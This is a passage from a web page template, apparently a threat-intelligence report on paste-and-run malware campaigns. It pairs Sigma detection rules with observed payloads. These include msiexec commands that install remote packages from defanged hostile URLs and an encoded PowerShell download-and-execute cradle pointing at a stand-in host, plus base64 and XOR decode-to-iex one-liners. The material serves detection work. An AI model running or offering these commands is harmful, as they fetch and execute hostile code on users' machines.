    <summary>Observed payloads ({{ site.data.clickgrab_trends.payload_examples.hidden_window | size }})</summary>
    {% for ex in site.data.clickgrab_trends.payload_examples.hidden_window %}
    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
  </details>
  {% endif %}
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: Browser or Explorer Spawning Hidden PowerShell
logsource:
  category: process_creation
  product: windows
detection:
  selection_interp:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\mshta.exe'
  selection_parent:
    ParentImage|endswith:
      - '\explorer.exe'
      - '\chrome.exe'
      - '\msedge.exe'
      - '\firefox.exe'
  selection_hidden:
    CommandLine|contains:
      - '-W Hidden'
      - '-WindowStyle Hidden'
      - '-NoProfile'
  condition: selection_interp and selection_parent and selection_hidden
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1059</span>
    <div>
      <div class="det-rec-title">Cradle-agnostic network fetch detection</div>
      <div class="det-rec-desc">Move from IWR/IRM string matching to: <em>PowerShell process → outbound HTTP/HTTPS to non-Microsoft, non-CDN domain → path ends in .ps1/.txt/.hta</em>. This catches IWR, Curl, WebClient, and any future cradle. Update Sigma rules to use process+network correlation, not command-string pattern matching.</div>
    </div>
  </div>
  {% assign all_cradle_examples = site.data.clickgrab_trends.payload_examples.iwr_iex | concat: site.data.clickgrab_trends.payload_examples.irm_iex | concat: site.data.clickgrab_trends.payload_examples.webclient | concat: site.data.clickgrab_trends.payload_examples.curl %}
  {% if all_cradle_examples.size > 0 %}
  <details>
    <summary>Observed payloads ({{ all_cradle_examples | size }})</summary>
    {% if site.data.clickgrab_trends.payload_examples.iwr_iex.size > 0 %}
    <div class="cg-payload-label">IWR / IEX</div>
    {% for ex in site.data.clickgrab_trends.payload_examples.iwr_iex %}
    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
    {% endif %}
    {% if site.data.clickgrab_trends.payload_examples.irm_iex.size > 0 %}
    <div class="cg-payload-label">IRM / IEX</div>
    {% for ex in site.data.clickgrab_trends.payload_examples.irm_iex %}
    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
    {% endif %}
    {% if site.data.clickgrab_trends.payload_examples.webclient.size > 0 %}
    <div class="cg-payload-label">WebClient</div>
    {% for ex in site.data.clickgrab_trends.payload_examples.webclient %}
    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
    {% endif %}
    {% if site.data.clickgrab_trends.payload_examples.curl.size > 0 %}
    <div class="cg-payload-label">Curl</div>
    {% for ex in site.data.clickgrab_trends.payload_examples.curl %}
    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
    {% endif %}
  </details>
  {% endif %}
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: PowerShell Outbound Fetch of Script Payload
logsource:
  category: network_connection
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_outbound:
    Initiated: 'true'
    DestinationPort:
      - 80
      - 443
  filter_internal:
    DestinationIp|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
  filter_ms:
    DestinationHostname|endswith:
      - '.microsoft.com'
      - '.windows.com'
      - '.azure.com'
  condition: selection_proc and selection_outbound and not (filter_internal or filter_ms)
level: high
# Pair with file_event rule matching *.ps1/*.txt/*.hta writes by the same ProcessGuid.</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-2">T1027</span>
    <div>
      <div class="det-rec-title">Detect Base64 decode + execute</div>
      <div class="det-rec-desc"><code>[Convert]::FromBase64String</code> or <code>[Text.Encoding]::UTF8.GetString</code> followed immediately by <code>iex</code> / <code>Invoke-Expression</code>. The encoding act itself is detectable even when the decoded content is not. Base64 jumped from 8.3% of domains in April 2026 to 67% in May 2026 (354/528) before receding in June.</div>
    </div>
  </div>
  {% if site.data.clickgrab_trends.payload_examples.base64.size > 0 %}
  <details>
    <summary>Observed payloads ({{ site.data.clickgrab_trends.payload_examples.base64 | size }})</summary>
    {% for ex in site.data.clickgrab_trends.payload_examples.base64 %}
    <div class="cg-payload-label">Encoded command</div>
    <pre class="cg-payload-example"><code>{{ ex.encoded }}</code></pre>
    <div class="cg-payload-label">Decoded</div>
    <pre class="cg-payload-example"><code>{{ ex.decoded }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
  </details>
  {% endif %}
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: PowerShell Base64 Decode Piped to Invoke-Expression
logsource:
  category: process_creation
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_decode_exec:
    CommandLine|contains|all:
      - 'FromBase64String'
      - 'iex'
  selection_enc:
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
      - '-e '
  condition: selection_proc and (selection_decode_exec or selection_enc)
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-2">T1070</span>
    <div>
      <div class="det-rec-title">File write → execute → delete correlation (new Dec 2025)</div>
      <div class="det-rec-desc">Self-delete appeared at scale in December 2025. Correlate: script written to <code>%TEMP%</code> → process execution from that path → file deletion within seconds. If artifact-based rules are your only coverage, they're now blind after execution completes. Use process execution telemetry, not file presence.</div>
    </div>
  </div>
  {% if site.data.clickgrab_trends.payload_examples.self_delete.size > 0 %}
  <details>
    <summary>Observed payloads ({{ site.data.clickgrab_trends.payload_examples.self_delete | size }})</summary>
    {% for ex in site.data.clickgrab_trends.payload_examples.self_delete %}
    <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
  </details>
  {% endif %}
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: Script Self-Delete After Execution From TEMP
# Correlation: file_event (write) + process_creation + file_event (delete) on same ProcessGuid/TargetFilename within 10s.
logsource:
  product: windows
detection:
  file_write:
    EventID: 11          # Sysmon File Created
    TargetFilename|contains:
      - '\Temp\'
      - '\AppData\Local\Temp\'
    TargetFilename|endswith:
      - '.ps1'
      - '.bat'
      - '.vbs'
      - '.hta'
  process_exec:
    EventID: 1           # Sysmon Process Create
    Image: '%file_write.TargetFilename%'
  file_delete:
    EventID: 23          # Sysmon File Deleted
    TargetFilename: '%file_write.TargetFilename%'
  condition: file_write | followed_by process_exec | followed_by file_delete within 10s
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-na">INFRA</span>
    <div>
      <div class="det-rec-title">CDN staging: pivot from domain blocking to path-pattern detection</div>
      <div class="det-rec-desc"><code>irp.cdn-website.com</code> is a legitimate CDN. Block it and you break legitimate sites. Instead, alert on PowerShell fetching from <code>*.cdn-website.com</code> paths matching <code>/files/uploaded/*.ps1</code>. Or use JA4/TLS fingerprinting on the outbound connection rather than the destination hostname.</div>
    </div>
  </div>
  {% if site.data.clickgrab_trends.payload_examples.cdn_staging.size > 0 %}
  <details>
    <summary>Observed staging URLs ({{ site.data.clickgrab_trends.payload_examples.cdn_staging | size }})</summary>
    {% for ex in site.data.clickgrab_trends.payload_examples.cdn_staging %}
    <pre class="cg-payload-example"><code>{{ ex.url }}</code></pre>
    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
    {% endfor %}
  </details>
  {% endif %}
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: PowerShell Fetching Script From CDN Uploads Path
# Path-based detection: keep the CDN reachable for legitimate use, catch the staging pattern.
logsource:
  category: proxy
detection:
  selection_client:
    c-useragent|contains:
      - 'WindowsPowerShell'
      - 'Microsoft.PowerShell'
  selection_host:
    r-dns|endswith: '.cdn-website.com'
  selection_path:
    cs-uri-path|contains: '/files/uploaded/'
    cs-uri-path|endswith:
      - '.ps1'
      - '.txt'
      - '.hta'
  condition: selection_client and selection_host and selection_path
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-2">T1218</span>
    <div>
      <div class="det-rec-title">Detect MSIExec fetching packages from non-enterprise URLs</div>
      <div class="det-rec-desc"><code>msiexec.exe</code> with <code>/i http</code> where the URL is not a known enterprise software source, spawned from <code>cmd.exe</code> or <code>explorer.exe</code> (Run dialog). Covers the 1,054-domain MSIExec delivery campaign that peaked at 87% in Nov 2025.</div>
    </div>
  </div>
  <details>
    <summary>Observed payloads (3)</summary>
    <pre class="cg-payload-example"><code>msiexec /i hxxps[://]shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>
    <div class="cg-payload-meta">Peak-campaign pattern. Long "verification" path, random CustomerID, cloudflare-themed lure.</div>
    <pre class="cg-payload-example"><code>msiexec /i hxxps[://]verifyhumanbot[.]com/pkg/update.msi /quiet /norestart</code></pre>
    <div class="cg-payload-meta">Silent install with <code>/quiet /norestart</code>. No prompts, no dialogs.</div>
    <pre class="cg-payload-example"><code>msiexec /i hxxp[://]198[.]13[.]158[.]127:5506/i.msi</code></pre>
    <div class="cg-payload-meta">Port-5506 direct-IP staging. Bypasses domain reputation. Raw IP + nonstandard port is the signal.</div>
  </details>
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: MSIExec Installing Package From Remote URL via Run Dialog
logsource:
  category: process_creation
  product: windows
detection:
  selection_proc:
    Image|endswith: '\msiexec.exe'
  selection_remote:
    CommandLine|contains:
      - '/i http://'
      - '/i https://'
  selection_parent:
    ParentImage|endswith:
      - '\cmd.exe'
      - '\explorer.exe'
      - '\powershell.exe'
  filter_enterprise:
    CommandLine|contains:
      - 'microsoft.com'
      - 'windowsupdate.com'
      - 'office.com'
  condition: selection_proc and selection_remote and selection_parent and not filter_enterprise
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1059</span>
    <div>
      <div class="det-rec-title">Detect inline payload decode-and-execute</div>
      <div class="det-rec-desc">PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 92% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection. Both are needed for full coverage.</strong></div>
    </div>
  </div>
  <details>
    <summary>Observed payloads (3)</summary>
    <pre class="cg-payload-example"><code>powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBiAGEAZAAuAGUAeABhAG0AcABsAGUALwBwAC4AcABzADEAIgApAA==</code></pre>
    <div class="cg-payload-meta">Classic <code>-EncodedCommand</code> dropper. Base64 decodes to an IEX + DownloadString cradle. The encoding is the signal, not the content.</div>
    <pre class="cg-payload-example"><code>powershell -c "$b=[Convert]::FromBase64String('...'); iex ([System.Text.Encoding]::UTF8.GetString($b))"</code></pre>
    <div class="cg-payload-meta"><code>FromBase64String</code> piped to <code>iex</code> inline. No network fetch. Entire payload ships in the clipboard paste.</div>
    <pre class="cg-payload-example"><code>powershell -c "$k=0x13; $e=@(0x42,0x17,0x26,...); -join($e|%{[char]($_ -bxor $k)})|iex"</code></pre>
    <div class="cg-payload-meta">XOR-decode loop. Single-byte key, byte array, <code>-bxor</code> reduction, piped to <code>iex</code>. Pure in-memory decode.</div>
  </details>
  <details>
    <summary>Example detection logic</summary>
<pre class="cg-payload-example"><code>title: PowerShell Inline Decode-and-Execute (No Network Fetch)
logsource:
  category: process_creation
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_encoded:
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
      - '-e '
  selection_xor:
    CommandLine|contains|all:
      - '-bxor'
      - '[char]'
  selection_b64_iex:
    CommandLine|contains|all:
      - 'FromBase64String'
      - 'iex'
  selection_parent:
    ParentImage|endswith:
      - '\explorer.exe'
      - '\cmd.exe'
      - '\chrome.exe'
      - '\msedge.exe'
      - '\firefox.exe'
  condition: selection_proc and selection_parent and (selection_encoded or selection_xor or selection_b64_iex)
level: high
# Run alongside the cradle-agnostic network fetch rule. Both are needed.</code></pre>
  </details>
</div>

</div><!-- /.cg-page / .trends-content -->
</div><!-- /.trends-layout -->

<!-- ── Data injection + chart init ──────────────────────────────────── -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/atom-one-dark.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/languages/powershell.min.js"></script>
<script>
window.CLICKGRAB_TRENDS = {{ site.data.clickgrab_trends | jsonify }};
</script>
<script src="{{ '/assets/js/clickgrab-trends.js' | relative_url }}"></script>
<script>
// Collapsible payload example toggles
document.querySelectorAll('.collapsible-header').forEach(function(header) {
  header.addEventListener('click', function() {
    var expanded = header.getAttribute('aria-expanded') === 'true';
    header.setAttribute('aria-expanded', String(!expanded));
    var target = header.getAttribute('data-target');
    var body = target ? document.getElementById(target) : null;
    if (body) body.classList.toggle('collapsed', expanded);
  });
});

// Infra table row expand toggles
document.querySelectorAll('.cg-infra-toggle').forEach(function(btn) {
  btn.addEventListener('click', function() {
    var expanded = btn.getAttribute('aria-expanded') === 'true';
    btn.setAttribute('aria-expanded', String(!expanded));
    var chevron = btn.querySelector('.collapsible-chevron');
    if (chevron) chevron.style.transform = expanded ? '' : 'rotate(90deg)';
    var row = document.getElementById(btn.getAttribute('data-target'));
    if (row) row.classList.toggle('expanded', !expanded);
  });
});

// Trends sidebar scroll spy
(function() {
  var navLinks = document.querySelectorAll('.trends-sidebar a');
  if (!navLinks.length) return;
  var sectionIds = [];
  navLinks.forEach(function(link) {
    sectionIds.push(link.getAttribute('href').slice(1));
  });
  var sections = sectionIds.map(function(id) { return document.getElementById(id); }).filter(Boolean);
  if (!sections.length) return;
  var observer = new IntersectionObserver(function(entries) {
    entries.forEach(function(entry) {
      if (entry.isIntersecting) {
        navLinks.forEach(function(link) {
          link.classList.toggle('active', link.getAttribute('href') === '#' + entry.target.id);
        });
      }
    });
  }, { rootMargin: '-20% 0px -70% 0px' });
  sections.forEach(function(section) { observer.observe(section); });
})();

// Syntax highlighting
(function() {
  if (typeof hljs === 'undefined') return;
  function detectLang(text) {
    if (/logsource:|condition:/.test(text)) return 'yaml';
    if (/\$[A-Za-z_]|\bIEX\b|\bInvoke-[A-Z]|\bFromBase64String\b/i.test(text)) return 'powershell';
    return 'bash';
  }
  document.querySelectorAll('pre.cg-payload-example code, pre.logic-block code').forEach(function(el) {
    var text = el.textContent || el.innerText;
    var lang = detectLang(text);
    el.textContent = text; // strip any existing HTML
    el.className = 'language-' + lang;
    hljs.highlightElement(el);
  });
})();
</script>
